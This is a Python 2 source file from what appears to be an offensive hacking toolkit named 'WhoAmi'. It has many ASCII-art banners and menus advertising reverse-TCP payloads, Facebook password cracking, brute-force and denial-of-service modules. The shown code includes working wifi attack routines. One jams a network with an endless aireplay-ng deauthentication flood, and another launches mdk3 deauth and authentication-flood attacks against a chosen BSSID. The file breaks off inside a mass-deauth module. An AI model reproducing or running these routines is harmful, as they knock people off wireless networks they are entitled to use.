  print "  ``   ``  ``   ``  ``  `-smNds+/NM:  `` `mM/  ``  ``  :Mm` ``  :MN/+sdNms-`  ``  ``   ``  ``   ``  "    
  print "``   ``  ``  ```  ``  ``   `:+yhdmMm/.``-yMh.``  ``  ``.hMy-``./mMmdhy+:`   ``  ``  ```  ``  ``   ``"   
  print "  ``   ``  ``   ``  ``   ``  ``  `:hNNmNNd+.   ``  ``   .+dNNmNNh:`  ``  ``   ``  ``   ``  ``   ``  "   
  print "``  ```  ``  ```  ``  ``   ``  ``   `....`   ``  ``  ``   `....`   ``  ``   ``  ``  ```  ``  ```  ``"   
  sem()

def banner_21():
  print default+"               -`                                                      :`"                           
  print "               /`                                                      +   "                           
  print "               /`                                                     `+   "                            
  print "               /`                                                     .:  "                            
  print "               /`                                                     -:  "                              
  print "               +`                                                     -:  "                             
  print "               +`                                                     /-   "                           
  print "              `o-`                                                  -+yy:    "                        
  print "             `sdo-                                                  o`.`:/    "                        
  print "            `+-` /:                                                 +/:-/-     "                      
  print "            `++++s/.`                                           `-:+shddhyyyo/-.`    "                  
  print "         :+osydhydyo///-`                                    .::/+sss//o.so/oy+://.    "                 
  print "      .oy+//+o+--/ossy/oo:.                                ./--:++:+/./--`+o..oo.`//`   "                
  print "    -:+/`//+/.+`::s/++-./s/-`                             ::`::/-/:+ .:`+ `y/ .o+` -+`  "                
  print "  `+-o-`/./:-./ /y/:::s./////-                           ::`+-/-:-s.`-:.+``//  s::  :+  "               
  print "  /-+/`/./+o:/o-syy:`-/+`.:/:+-                         .o/o/oo/s/s:://:o-:/s//y+/::/s. "                
  print " `yoo/:o-+.+`-/`+:s/ `:s-.-s/+o`                        :+++:s/++:+-:/::+--/y--o/o:-./:  "              
  print " -:///+s++-+:/o:so/o--.//.`-/--.                        /-:-`/ :- +  -:.:  .s` /.+.  /:  "               
  print " :.:/`-:./ :`./ /--+//`./.:+/-.:                        +.:../ :. o  .:.-  .o` /./.  ::  "               
  print " +/o+.:/./ :`./ /-`::..:o-//s:`:                .       +.:-./ :. o  .:..  .o` /s++://:  "              
  print " ::++o+s++ :`./ ::`/-+--+ `-o/-/.....`...````` ./       +./.`: :. o  `/-.  .s` /:o+.::/   "              
  print " :-:/:-o:/ :`-+ ::`/:`  +`  +.`   `     `` `:/../:...   /./.`: :.`+  ./--  -y` /:o/.:+/`  "              
  print " :::o:-o+s`/.-/`:o//`  `o:../ooo/+:.........:+:/o+/::.  /./:.o://+y//+++o//+y+/yoo+./oy:--"            
  print " -/+yo+/os-o:/+-+/`/`   o-  :yo///`             ::.:`   :so++o.:.`+  ././  -y``+:o/+o/+::"              
  print " .yoso/s:o.+:-o/-..+----s+::+s/o-.                      ://o/o:+/-s--:o/o--/y--+:o:--+-"               
  print " `/ //`o.+-/:-o-.../:`  --  :+-o                        -:-:`+ -: o `./--  :s` /`+.  /`"               
  print " `/`/: / /.--:+.   :.   .: `-+:s                        -:./`+ :/:s:../:-  :s  +`+`  + "                
  print "  +.:/`+ -:.+/+++/::/-.`.:`.-o/s`                       .:`+`+..o//:o+/.-..sy-`o`+` `/ "                 
  print "  /::s-o-//-+mmdMMMdyNdddsydNsdd/                       -: +.:-o+::/:-/``.+/.----s:`./ "              
  print "  -o-+.  -/`-sNdMMMmyMMMMNMMMhMMMm:                     -/-s//+:o:/-`.+..+o+o//`/o/.-:"                
  print "   -/o/-`.o .:oydNNNyMMMMMMMNs+NMMN.                    .+:o-`..s:/:::+-:::+/+-/so--o/"                
  print "       `.-::--/+/////++yNMMMM: sMMMo                       `.---+:---:+/+ooh+.+y+/-.` "                
  print "                        oMMMM: -MMMh                                         .-`  "                 
  print "     `:/:  ```          /MMMM.  hMMN.   "               
  print "    -+/:/-:-`:----      :MMMm`  :dh+`                                          ` .  `` "                
  print "   `o-:--:.:::---.``    :MMMm`   `y/+ooo/                                  .-:....-`. "                
  print "    s::::-::-::---.-`   `sso+`    `                                         `"                     
  print "     `+o+/--` ...        .yh`   "                         
  print "    ```.-```````````      -y-   "                            
  print "       ``````````          `oy.  "                         
  sem()                                                                                                              
                                                        

def banner_22():
  print default +"""                        aa@@@@@@@@@@@@@aa              """
  print default +"""                     a@@@@@@@@@@@@@@@@@@@@@a              """
  print default +"""                   a@@@@@@@@@@@@@@@@@@@@@@@@@a              """
  print default +"""                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
  print default +"""                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
  print default +"""                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
  print default +"""                 @@@@@@@~~~~@@@@@@@@@~~~~@@@@@@@              """
  print default +"""                 @@@@@@      @@@@@@@      @@@@@@              """
  print default +"""                 @@@@@@@aaaa@@@@@@@@@aaaa@@@@@@@              """
  print default +"""                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
  print default +"""                 `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'              """
  print default +"""                  @@@@@@@@~@@@~@@@~@@@~@@@@@@@@              """
  print default +"""                   @@@@@@@@@@@@@@@@@@@@@@@@@@@              """
  print default +"""                    @@@@@@@@~@@@~@@@~@@@@@@@@              """
  print default +"""                     @@@@@@@@@@@@@@@@@@@@@@@              """
  print default +"""                      @@@@@@@@~@@@~@@@@@@@@              """
  print default +"""                       `@@@@@@@@@@@@@@@@@'              """
  print default +"""                           ~~@@@@@@@~~              """
  sem()


def banner_23():
  print default +"""                        @@@              """
  print default +"""                        @@@              """
  print default +"""                         @@@              """
  print default +"""                         @@@              """
  print default +"""                 @@@@@@@@@@@@@@@@@@@@@@              """
  print default +"""               @@@@@@@@@@@@@@@@@@@@@@@@@@              """
  print default +"""             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
  print default +"""           @@@@@@@@ @@@@@@@@@@@@@@@@ @@@@@@@@              """
  print default +"""         @@@@@@@@@   @@@@@@@@@@@@@@   @@@@@@@@@              """
  print default +"""       @@@@@@@@@@     @@@@@@@@@@@@     @@@@@@@@@@              """
  print default +"""      @@@@@@@@@@       @@@@  @@@@       @@@@@@@@@@              """
  print default +"""      @@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@              """
  print default +"""      @@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@              """
  print default +"""      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
  print default +"""      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
  print default +"""      @@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@              """
  print default +"""       @@@@@@@@  @@ @@ @@ @@ @@ @@ @@ @  @@@@@@@@              """
  print default +"""         @@@@@@@                        @@@@@@@              """
  print default +"""           @@@@@@  @@ @@ @@ @@ @@ @@ @ @@@@@@              """
  print default +"""            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
  print default +"""               @@@@@@@@@@@@@@@@@@@@@@@@@@              """
  print default +"""                 @@@@@@@@@@@@@@@@@@@@@@              """
  sem()
 
def banner_24():
  print default +'''                          ooo              '''
  print default +'''                         $ o$              '''
  print default +'''                        o $$              '''
  print default +'''              ""$$$    o" $$ oo "              '''
  print default +'''          " o$"$oo$$$"o$$o$$"$$$$$ o              '''
  print default +'''         $" "o$$$$$$o$$$$$$$$$$$$$$o     o              '''
  print default +'''      o$"    "$$$$$$$$$$$$$$$$$$$$$$o" "oo  o              '''
  print default +'''     " "     o  "$$$o   o$$$$$$$$$$$oo$$              '''
  print default +'''    " $     " "o$$$$$ $$$$$$$$$$$"$$$$$$$o              '''
  print default +'''  o  $       o o$$$$$"$$$$$$$$$$$o$$"""$$$$o " "              '''
  print default +''' o          o$$$$$"    "$$$$$$$$$$ "" oo $$   o $              '''
  print default +''' $  $       $$$$$  $$$oo "$$$$$$$$o o $$$o$$oo o o              '''
  print default +'''o        o $$$$$oo$$$$$$o$$$$ ""$$oo$$$$$$$$"  " "o              '''
  print default +'''"   o    $ ""$$$$$$$$$$$$$$  o  "$$$$$$$$$$$$   o "              '''
  print default +'''"   $      "$$$$$$$$$$$$$$   "   $$$"$$$$$$$$o  o              '''
  print default +'''$   o      o$"""""$$$$$$$$    oooo$$ $$$$$$$$"  "              '''
  print default +'''$      o""o $$o    $$$$$$$$$$$$$$$$$ ""  o$$$   $ o              '''
  print default +''' o     " "o "$$$$  $$$$$""""""""""" $  o$$$$$"" o o              '''
  print default +''' "  " o  o$o" $$$$o   ""           o  o$$$$$"   o              '''
  print default +'''  $         o$$$$$$$oo            "oo$$$$$$$"    o              '''
  print default +'''  "$   o o$o $o o$$$$$"$$$$oooo$$$$$$$$$$$$$$"o$o              '''
  print default +'''    "o oo  $o$"oo$$$$$o$$$$$$$$$$$$"$$$$$$$$"o$"              '''
  print default +'''     "$ooo $$o$   $$$$$$$$$$$$$$$$ $$$$$$$$o"              '''
  print default +'''        "" $$$$$$$$$$$$$$$$$$$$$$" """"              '''
  print default +'''                         """"""              '''
  sem()


def banner_25():
  print default +"""                             __        """
  print default +"""                            |  |        """
  print default +"""                            |  |         """
  print default +"""                        ___/____\___       """
  print default +"""                   _- ~              ~  _      """
  print default +"""                - ~                      ~ -_    """
  print default +"""              -                               _    """
  print default +"""            -         /\            /\          _   """
  print default +"""           -         / *\          / *\          _    """
  print default +"""          _         /____\        /____\          _    """
  print default +"""          _                  /\                   _    """
  print default +"""          _                 /__\                  _    """
  print default +"""          _      |\                      /|       _   """
  print default +"""           -     \ `\/\/\/\/\/\/\/\/\/\/' /      _     """
  print default +"""            -     \                      /      -     """
  print default +"""              ~    `\/^\/^\/^\/^\/^\/^\/'      ~    """
  print default +"""                ~                            -~    """
  print default +"""                 `--_._._._._._._._._._.._--'   """
  sem()
def banner_26():
  print default +"""                            ........              """
  print default +"""                            ;::;;::;,              """
  print default +"""                            ;::;;::;;,              """
  print default +"""                           ;;:::;;::;;,              """
  print default +"""           .vnmmnv%vnmnv%,.;;;:::;;::;;,  .,vnmnv%vnmnv,   """
  print default +"""        vnmmmnv%vnmmmnv%vnmmnv%;;;;;;;%nmmmnv%vnmmnv%vnmmnv    """
  print default +"""      vnmmnv%vnmmmmmnv%vnmmmmmnv%;:;%nmmmmmmnv%vnmmmnv%vnmmmnv   """
  print default +"""     vnmmnv%vnmmmmmnv%vnmmmmmmmmnv%vnmmmmmmmmnv%vnmmmnv%vnmmmnv    """
  print default +"""    vnmmnv%vnmmmmmnv%vnmmmmmmmmnv%vnmmmmmmmmmmnv%vnmmmnv%vnmmmnv     """
  print default +"""   vnmmnv%vnmmmmmnv%vnmm;mmmmmmnv%vnmmmmmmmm;mmnv%vnmmmnv%vnmmmnv,   """
  print default +"""  vnmmnv%vnmmmmmnv%vnmm;  mmmmmnv%vnmmmmmmm;  mmnv%vnmmmnv%vnmmmnv    """
  print default +"""  vnmmnv%vnmmmmmnv%vn;;    mmmmnv%vnmmmmmm;;    nv%vnmmmmnv%vnmmmnv    """
  print default +""" vnmmnv%vnmmmmmmnv%v;;      mmmnv%vnmmmmm;;      v%vnmmmmmnv%vnmmmnv   """
  print default +""" vnmmnv%vnmmmmmmnv%vnmmmmmmmmm;;       mmmmmmmmmnv%vnmmmmmmnv%vnmmmnv   """
  print default +""" vnmmnv%vnmmmmmmnv%vnmmmmmmmmmm;;     mmmmmmmmmmnv%vnmmmmmmnv%vnmmmnv   """
  print default +""" vnmmnv%vnmmmmm nv%vnmmmmmmmmmmnv;, mmmmmmmmmmmmnv%vn;mmmmmnv%vnmmmnv   """
  print default +""" vnmmnv%vnmmmmm  nv%vnmmmmmmmmmnv%;nmmmmmmmmmmmnv%vn; mmmmmnv%vnmmmnv   """
  print default +""" `vnmmnv%vnmmmm,  v%vnmmmmmmmmmmnv%vnmmmmmmmmmmnv%v;  mmmmnv%vnnmmnv' """
  print default +"""  vnmmnv%vnmmmm;,   %vnmmmmmmmmmnv%vnmmmmmmmmmnv%;    mmmnv%vnmmmmnv  """
  print default +"""   vnmmnv%vnmmmm;;,   nmmm;,              mmmm;;     mmmnv%vnmmmmnv'"""
  print default +"""   `vnmmnv%vnmmmmm;;,.         mmnv%v;,            mmmmnv%vnmmmmnv'"""
  print default +"""    `vnmmnv%vnmmmmmmnv%vnmmmmmmmmnv%vnmmmmmmnv%vnmmmmmnv%vnmmmmnv' """
  print default +"""      `vnmvn%vnmmmmmmnv%vnmmmmmmmnv%vnmmmmmnv%vnmmmmmnv%vnmmmnv' """
  print default +"""          `vn%vnmmmmmmn%:%vnmnmmmmnv%vnmmmnv%:%vnmmnv%vnmnv' """
  sem()
 
 
def banner_27():
  print default +""" ______________________________________________________________________________"""
  print default +"""|                                                                              |"""
  print default +"""|                          3Kom SuperHack II Logon                             |"""
  print default +"""|______________________________________________________________________________|"""
  print default +"""|                                                                              |"""
  print default +"""|                                                                              |"""
  print default +"""|                                                                              |"""
  print default +"""|                 User Name:          [    """+red+"""WhoAmi"""+default+"""     ]                        |"""
  print default +"""|                                                                              |"""
  print default +"""|                 Password:           [               ]                        |"""
  print default +"""|                                                                              |"""
  print default +"""|                                                                              |"""
  print default +"""|                                                                              |"""
  print default +"""|                                   [ OK ]                                     |"""
  print default +"""|______________________________________________________________________________|"""
  print default +"""|                                                                              |"""
  print default +"""|                                                        github://amerlaceset  |"""
  print default +"""|______________________________________________________________________________|"""
  print ""
  sem()

 
def banner():
 e = str(random.randint(1,27))
 if e in "1":
   banner_1()
 elif e in "2":
   banner_2()
 elif e in "3":
   banner_3()
 elif e in "4":
   banner_4()
 elif e in "5":
   banner_5()
 elif e in "6":
   banner_6()
 elif e in "7":
   banner_7()
 elif e in "8":
   banner_8()
 elif e in "9":
   banner_9()
 elif e in "10":
   banner_10()
 elif e in "11":
   banner_11()
 elif e in "12":
   banner_12()
 elif e in "13":
   banner_13()
 elif e in "14":
   banner_14()
 elif e in "15":
   banner_15()
 elif e in "16":
   banner_16()
 elif e in "17":
   banner_17()
 elif e in "18":
   banner_18()
 elif e in "19":
   banner_19()
 elif e in "20":
   banner_20()
 elif e in "21":
   banner_21() 
 elif e in "22":
   banner_22()
 elif e in "23":
   banner_23()
 elif e in "24":
   banner_24() 
 elif e in "25":
   banner_25()
 elif e in "26":
   banner_26() 
 elif e in "27":
   banner_27()
 else :
   print "error"
#222222222222222222222222222222222222222222222222222{end banner}2222222222222222222222222222
def help():
 print ""
 print "Usage Commands     "
 print "===============     "
 print "    Commands                    Description     "
 print "    ------------		-------------     "
 print "    help           		Help menu     "
 print "    ifconfig                    check my ip with router                       "
 print "    whoami                      whoami                                     "
 print "    os                          Run Linux Commands(ex : os ifconfig)"
 print "    my_ip                       check my ip                                    "
 print "    use                         Select Module For Use                        "
 print "    clear                       Clear the menu     "
 print "    show exploits               Show Backdoors of Current Database     "
 print "    show payloads               Show Injectors(Shellcode,dll,so etc..)     "
 print "    show wireless               show Wireless(attack,oin,wps..)"
 print "    show auxiliary              Show Encoders(Py,Ruby,PHP,Shellcode etc..)     "
 print "    show communication          Show Communication"
 print "    show amerr                  Show My Info"
 print "    show span                   Show Spam"
 print "    exit                        Exit            " 
 print ""

def help_help():
 print ""
 print "Injector  Commands     "
 print "===================     "
 print "    Commands                    Description     "
 print "    ------------		-------------     "
 print "    help           		Help menu     "
 print "    ifconfig                    check my ip with router        "
 print "    whoami                      whoami                                     "
 print "    os                          Run Linux Commands(ex : os ifconfig)"
 print "    my_ip                       check my ip       "
 print "    set                         Set Value Of Options To Modules    "
 print "    clear                       Clear the menu     "
 print "    show options                Show Shellcodes of Current Database         "
 print "    generate                    Generate {backdoor or payloads}             "
 print "    back                        Exit Current Module           " 
 print "    exit                        Exit tools           " 
 print ""

def auxiliary():
  print ""
  print "auxiliary "
  print "==========   "
  print "   #      Name                                          Description"
  print "   -      ----                                          -----------"
  print "   01     ip_number_information                         Collection of IP information"
  print "   02     admin_panel_findler                           Admin panel"
  print "   03     gather_shodan_search                          Shodan Search"
  print "" 

def payloads():
  print ""
  print "payloads "
  print "========="
  print "   #      Name                                          Description"
  print "   -      ----                                          -----------"
  print "   01     payload_unix_python_reverse_tcp               Payload python"
  print "   02     payload_unix_python2_reverse_tcp              Payload python"
  print "   03     payload_unix_php_reverse_tcp                  Payload php"
  print "   04     payload_unix_perl_reverse_tcp                 Payload perl"
  print "   05     payload_unix_perl2_reverse_tcp                Payload perl"
  print "   06     payload_unix_bash_reverse_tcp                 Payload bash"
  print "   07     payload_unix_ncat_reverse_tcp                 Payload ncat"
  print "   08     payload_unix_ruby_reverse_tcp                 Payload ruby"
  print "   09     payload_windows_asm_reverse_tcp               Payload assemblly"
  print "   10     payload_windows_ps_reverse_tcp                Payload powershell"
  print "   11     payload_camera_html_reverse_tcp               Payload html"
  print ""
 
def exploits():
  print ""
  print "exploits"
  print "========="
  print "   #      Name                                          Description"
  print "   -      ----                                          -----------"
  print "   01     crack_password_facebook                       Cracking password facebook"
  print "   02     available_facebook_motah                      Number numbers available"
  print "   03     dos_attack_socket                             Dos Attack"
  print "   04     dos_attack_requests                           Dos Attack"
  print "   05     crack_password_file_rar                       Cracking password file rar"
  print "   06     crack_password_file_zip                       Cracking password file zip"
  print "   07     brute_force_to_ftp_protocol                   Cracking password"
  print "   08     brute_force_to_sql_protocol                   Cracking password"
  print "   09     brute_force_to_ssh_protocol                   Cracking password"
  print "   10     brute_force_to_pop3_protocol                  Cracking password"
  print ""

def wireless():
  print ""
  print "wireless  "
  print "========="
  print "   #      Name                                          Description"
  print "   -      ----                                          -----------"
  print "   01     wifi_mass_deauth                              Mass Deauthentication Attack"
  print "   02     wifi_wifi_jammer                              Wifi Jammer"
  print "   03     wifi_wifi_dos                                 Wifi Dos Attack" 
  print "   04     wifi_wifi_honeypot                            Wireless Honeypot(Fake AP)"
  print "   05     wifi_evil_twin                                Wireless attack evil twin"
  print "   06     wifi_wps_pin                                  Wireless cracking with pin"
  print "   07     wifi_pass_saved                               Wifi Password saved"
  print "   08     bluetooth_bluetooth_pod                       Bluetooth Ping Of Death Attack"
  print ""
def communication():
  print ""
  print "communication"
  print "=============="
  print "   #      Name                                          Description"
  print "   -      ----                                          -----------"
  print "   01     continue_in_secrecy_server_1                  server communication"
  print "   02     continue_in_secrecy_client_1                  connect with server communication"
  print ""

def network():
  print ""
  print "network"
  print "========"
  print "   #      Name                                          Description"
  print "   -      ----                                          -----------"
  print ""
  
def spam():
  print ""
  print "spam"
  print "====="
  print "   #      Name                                          Description"
  print "   -      ----                                          -----------"
  print "   01     create_fake_nember                            Make a phone number"
  print ""
  
def amerr():
  print ""
  print "amerr"
  print "====="
  print "   #      Name                                          Description"
  print "   -      ----                                          -----------"
  print "   01     github_account                                My Account Github"
  print "   02     channel_youtube                               My Channel Youtube"
  print "   03     facebook_account                              My Account Facebook"
  print "   04     { Amer Amerr }                                { Amer Amerr }"
  print "   05     { I LOVE YOU }                                { I LOVE YOU }"
  print ""

def github_account():
 print ""
 time.sleep(2)
 print default+'  {'+blue+'Amerlaceset'+default+'}--------{'+blue+'https://github.com/Amerlaceset'+default+'}'
 time.sleep(6)
 webbrowser.open_new('https://github.com/Amerlaceset')
 os.system('termux-open https://github.com/Amerlaceset')
 WhoAmi()
def channel_youtube():
 print ""
 time.sleep(2)
 #print default+'  {'+red+'Virus4 Hacking'+default+'}--------{'+red+'https://www.youtube.com/channel/UCmQETFbkmkiSiu3og6F8usg'+default+'}'
 time.sleep(6)
 #webbrowser.open_new('https://www.youtube.com/channel/UCmQETFbkmkiSiu3og6F8usg')
 #os.system("termux-open https://www.youtube.com/channel/UCmQETFbkmkiSiu3og6F8usg ") 
 print "no channel"
 WhoAmi()
def facebook_account():
 print ""
 time.sleep(2)
 print default+'  {'+blue+'Amer Amer'+default+'}--------{'+blue+'https://www.facebook.com/100019536310282'+default+'}'
 time.sleep(6)
 webbrowser.open_new('https://www.facebook.com/100019536310282')
 os.system('termux-open https://www.facebook.com/100019536310282')
 WhoAmi()
def my_ip():
 print ""
 
 my_ip = requests.get('https://api.myip.com/')
 data = my_ip.json()
 print basic_green + 'Country       :      ' + white + data['country'] + '[' + data['cc'] + ']' 
 print basic_green + 'my_ip         :      ' + white + data['ip'] 
 
 
#HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHh{wifi}jjjjjjjjjjjjjjjjjjjjjjkkk0jjjjjjjkkkkkkkkk
interface = ['wlan0']
bssid = ['00:00:00:00:00:00']
essid = ['freewifi']
mon = ['wlan0mon']
channel = ['11']
def wifi_wifi_jammer():
 try:
  amerr = str(raw_input(default+'WhoAmi wireless('+red+'wifi_wifi_jammer'+default+') > '))
  
  if  amerr[:13] == "set interface" or  amerr[:13] == "set INTERFACE" :
     interface[0] = amerr[14:]
     print "INTERFACE => ", interface[0]
     wifi_wifi_jammer()
  elif  amerr[:9] == "set bssid" or  amerr[:9] == "set BSSID" :
     bssid[0] = amerr[10:]
     print "BSSID => ", bssid[0]
     wifi_wifi_jammer()
  elif  amerr[:9] == "set essid" or  amerr[:9] == "set ESSID" :
     essid[0] = amerr[10:]
     print "ESSID => ", essid[0]
     wifi_wifi_jammer()
  elif  amerr[:7] == "set mon" or  amerr[:7] == "set MON" :
     mon[0] = amerr[8:]
     print "MON => ", mon[0]
     wifi_wifi_jammer()   
  elif  amerr[:11] == "set channel" or  amerr[:11] == "set CHANNEL" :
     channel[0] = amerr[12:]
     print "CHANNEL => ", channel[0]
     wifi_wifi_jammer()  
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (wifi_wifi_jammer):" 
   print ""
   print "       Name       Current Setting      Required      Description"
   print "       interface  "+interface[0]+"                yes           Wireless Interface Name"
   print "       bssid      "+bssid[0]+"    yes           Target BSSID Address"
   print "       essid      "+essid[0]+"             yes           Target ESSID Name"
   print "       mon        "+mon[0]+"             yes           Monitor Mod(default)"
   print "       channel    "+channel[0]+"                   yes           Target Channel Number"
   print ""
   print ""
   wifi_wifi_jammer()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
    print blue + "[*]"+default+"Attack Has Been Started on : " + str(essid[0]) 
    xterm_3 = "xterm -e airodump-ng -c " + str(channel[0]) + " --bssid " + str(bssid[0]) + " " + str(mon[0]) + " &"
    os.system(xterm_3)
    time.sleep(4)
    xterm_4 = "xterm -e aireplay-ng --deauth 9999999999999 -o 1 -a " + str(bssid[0]) + " -e " + str(essid[0]) + " " + str(mon[0]) + " &"
    os.system(xterm_4)
    time.sleep(1)
    os.system(xterm_4)
    wifi_wifi_jammer()   
 
  elif amerr[:4] == 'help':
   help_help()
   wifi_wifi_jammer()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    wifi_wifi_jammer()
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    wifi_wifi_jammer()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  wifi_wifi_jammer()
  
 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    wifi_wifi_jammer()

interface = ['wlan0']
bssid = ['00:00:00:00:00:00']
essid = ['freewifi']
mon = ['wlan0mon']
channel = ['11']
def wifi_wifi_dos():
 try:
  amerr = str(raw_input(default+'WhoAmi wireless('+red+'wifi_wifi_dos'+default+') > '))
  
  if  amerr[:13] == "set interface" or  amerr[:13] == "set INTERFACE" :
     interface[0] = amerr[14:]
     print "INTERFACE => ", interface[0]
     wifi_wifi_dos()
  elif  amerr[:9] == "set bssid" or  amerr[:9] == "set BSSID" :
     bssid[0] = amerr[10:]
     print "BSSID => ", bssid[0]
     wifi_wifi_dos()
  elif  amerr[:9] == "set essid" or  amerr[:9] == "set ESSID" :
     essid[0] = amerr[10:]
     print "ESSID => ", essid[0]
     wifi_wifi_dos()
  elif  amerr[:7] == "set mon" or  amerr[:7] == "set MON" :
     mon[0] = amerr[8:]
     print "MON => ", mon[0]
     wifi_wifi_dos()   
  elif  amerr[:11] == "set channel" or  amerr[:11] == "set CHANNEL" :
     channel[0] = amerr[12:]
     print "CHANNEL => ", channel[0]
     wifi_wifi_dos()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (wifi_wifi_dos):" 
   print ""
   print "       Name       Current Setting      Required      Description"
   print "       interface  "+interface[0]+"                yes           Wireless Interface Name"
   print "       bssid      "+bssid[0]+"    yes           Target BSSID Address"
   print "       essid      "+essid[0]+"             yes           Target ESSID Name"
   print "       mon        "+mon[0]+"             yes           Monitor Mod(default)"
   print "       channel    "+channel[0]+"                   yes           Target Channel Number"
   print ""
   print ""
   wifi_wifi_dos()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
     cmd_0 = "airmon-ng stop " + mon[0]
     subprocess.Popen(cmd_0, stdout = subprocess.PIPE, stderr = subprocess.PIPE, shell=True).wait()
     cmd_1 = "airmon-ng start " + interface[0] + " " + channel[0]
     subprocess.Popen(cmd_1, stdout = subprocess.PIPE, stderr = subprocess.PIPE, shell=True).wait()
     print blue+"[*]"+default+"Monitor Mod .... Enabled."
     time.sleep(1)
     os.chdir("/Temp")
     os.system("xterm -e rm -rf blacklist")
     openf = "echo " + bssid[0] + " >>blacklist"
     os.system(openf)
     print blue+"[*]"+default+"BlackList File .... Created." 
     time.sleep(1)
     xterm_1 = "xterm -e mdk3 " + mon[0] + " d -b blacklist -c " + channel[0] + " &"
     os.system(xterm_1)
     print blue+ "[*]"+default+"Deauthentication - Dissasocition Attack .... Started." 
     time.sleep(1)
     xterm_2 = "xterm -e mdk3 " + mon[0] + " a -m -i " + bssid[0] + " &"
     os.system(xterm_2)
     print blue+ "[*]"+default+"Authentication DOS Attack .... Started." 
     time.sleep(1)
     xterm_3 = "xterm -e aireplay-ng --deauth 9999999999999 -o 1 -a " + bssid[0] + " -e " + essid[0] + " " + mon[0] + " &"
     os.system(xterm_3)
     print blue +"[*]"+default+"Wifi Jamming Attack .... Started." 
     time.sleep(1)
     print blue +"[*]"+default+"WIFI DOS Attack Has Been Started ..." 
     wifi_wifi_dos()
 
  elif amerr[:4] == 'help':
   help_help()
   wifi_wifi_dos()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    wifi_wifi_dos()
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    wifi_wifi_dos()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  wifi_wifi_dos()
  
 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    wifi_wifi_dos()

interface = ['wlan0']
bssid = ['00:00:00:00:00:00']
essid_file = ['/tmp/essid.txt']
mon = ['wlan0mon']
packet_len = ['5']
def wifi_mass_deauth():
 try:
  amerr = str(raw_input(default+'WhoAmi wireless('+red+'wifi_mass_deauth'+default+') > '))
  
  if  amerr[:13] == "set interface" or  amerr[:13] == "set INTERFACE" :
     interface[0] = amerr[14:]
     print "INTERFACE => ", interface[0]
     wifi_mass_deauth()
  elif  amerr[:9] == "set bssid" or  amerr[:9] == "set BSSID" :
     bssid[0] = amerr[10:]
     print "BSSID => ", bssid[0]
     wifi_mass_deauth()
  elif  amerr[:14] == "set essid_file" or  amerr[:14] == "set ESSID_FILE" :
     essid_file[0] = amerr[15:]
     print "ESSID_FILE => ", essid_file[0]
     wifi_mass_deauth()
  elif  amerr[:7] == "set mon" or  amerr[:7] == "set MON" :
     mon[0] = amerr[8:]
     print "MON => ", mon[0]
     wifi_mass_deauth() 
  elif  amerr[:14] == "set packet_len" or  amerr[:14] == "set PACKET_LEN" :
     packet_len[0] = amerr[15:]
     print "PACKET_LEN => ", packet_len[0]
     wifi_mass_deauth()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (wifi_mass_deauth):" 
   print ""
   print "       Name         Current Setting      Required      Description"
   print "       interface    "+interface[0]+"                yes           Wireless Interface Name"
   print "       bssid        "+bssid[0]+"    yes           Target BSSID Address"
   print "       essid_file   "+essid_file[0]+"       yes           File Contain Client ESSID"
   print "       mon          "+mon[0]+"             yes           Monitor Mod(default)"
   print "       packet_len   "+packet_len[0]+"                    yes           Number of Packets"
   print ""
   print ""
   wifi_mass_deauth()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
